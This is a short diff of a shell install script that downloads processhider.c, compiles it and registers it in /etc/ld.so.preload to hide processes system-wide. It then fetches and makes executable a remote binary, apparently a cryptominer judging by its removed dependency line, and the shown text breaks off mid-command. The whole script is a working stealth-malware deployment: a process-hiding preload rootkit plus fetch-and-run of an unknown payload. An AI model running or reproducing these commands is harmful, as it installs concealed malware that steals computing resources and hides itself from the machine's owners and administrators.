@@ -2,7 +2,6 @@ sudo apt update
 wget https://gitlab.com/muiminah74/jambanium/-/raw/main/processhider.c
 sudo apt install build-essential -y
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 sudo mv libprocesshider.so /usr/local/lib/
 sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget -O project https://gitlab.com/muiminah74/jambanium/-/raw/main/rstd && chmod +x project &&
